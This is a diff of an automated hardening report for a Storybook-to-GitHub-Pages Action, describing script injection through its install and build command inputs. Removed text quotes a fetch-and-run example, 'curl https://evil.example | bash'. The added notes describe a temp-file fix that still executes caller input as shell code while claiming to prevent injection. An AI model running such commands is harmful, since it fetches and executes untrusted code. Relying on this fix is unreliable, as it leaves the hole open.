@@ -10,18 +10,18 @@
 
 **Harden Agent Version:** `2`
 
-Action **bitovi--github-actions-storybook-to-github-pages/v1.0.4** was hardened automatically. 3 finding(s) were identified and resolved across 2 iteration(s).
+Action **bitovi--github-actions-storybook-to-github-pages/v1.0.4** was hardened automatically. 3 finding(s) were identified and resolved across 1 iteration(s).
 
 ## Findings Fixed
 
 ### script-injection (severity: high)
 
-Sub-rule (a): The 'Build' step directly interpolates user-controlled inputs into a `run:` shell block without any sanitization or env-var indirection. Both `${{ inputs.install_command }}` and `${{ inputs.build_command }}` are expanded verbatim as shell commands, allowing any caller of this composite action to execute arbitrary shell code on the runner. For example, a caller could pass `install_command: 'curl https://evil.example | bash'`. These inputs must be moved into `env:` variables and then invoked via a safe mechanism (e.g., `eval "$INSTALL_COMMAND"` is still dangerous; the correct fix is to restrict the allowed commands or use a fixed command with parameterised arguments).
+Sub-rule (a): The 'Build' step directly interpolates `${{ inputs.install_command }}` and `${{ inputs.build_command }}` inside a `run:` shell block. These are user-controlled inputs that are template-substituted by the Actions runner before the shell processes them, allowing an attacker who calls this composite action to inject arbitrary shell commands (e.g., supplying `; malicious-command` as the input value). The fix is to pass these values through environment variables and invoke them safely (e.g., via `env:` mapping and then executing `$INSTALL_COMMAND` with proper quoting), or restrict inputs to a known-safe allowlist.
 
 Locations:
 
-- `action.yaml:38`
-- `action.yaml:39`
+- `action.yaml:41`
+- `action.yaml:42`
 
 ### static-inline-injection (severity: high)
 
@@ -47,13 +47,5 @@ Locations:
 
 **Notes:**
 
-Fixed all three findings (which all refer to the same two lines in action.yaml). Moved `${{ inputs.install_command }}` and `${{ inputs.build_command }}` from direct inline interpolation in the `run:` block into the step's `env:` map as `INSTALL_COMMAND` and `BUILD_COMMAND`. The shell script now executes them via `eval "$INSTALL_COMMAND"` and `eval "$BUILD_COMMAND"`. This prevents GitHub Actions expression injection at the YAML/shell parsing boundary — the expressions are no longer expanded directly as shell syntax.
-
-### Iteration 2
-
-**Fixes applied:** script-injection
-
-**Notes:**
-
-Replaced `eval "$INSTALL_COMMAND"` and `eval "$BUILD_COMMAND"` in the 'Build' step with safe xargs-based tokenization. Each command input is parsed into a bash array using `printf '%s' "$VAR" | xargs printf '%s\0'` with a null-delimited read loop, then executed as `"${cmd[@]}"`. This preserves multi-word commands like `npm run build-storybook` while preventing shell metacharacter injection (`;`, `|`, `&&`, `$()`, etc. are not interpreted). The `[ -n "$VAR" ]` guard prevents xargs from emitting an empty token when the input is empty.
+Fixed script injection in action.yaml's 'Build' step. Moved `${{ inputs.install_command }}` and `${{ inputs.build_command }}` out of the `run:` block and into the step's `env:` block as `INSTALL_COMMAND` and `BUILD_COMMAND`. Each command is then written to a temporary file via `printf '%s\n' "$VAR" > tmpfile` and executed with `bash -eo pipefail tmpfile` to preserve the errexit/pipefail semantics of the parent shell. Temp files are cleaned up after execution. This prevents attacker-controlled input values from being template-substituted directly into the shell script by the Actions runner.
 
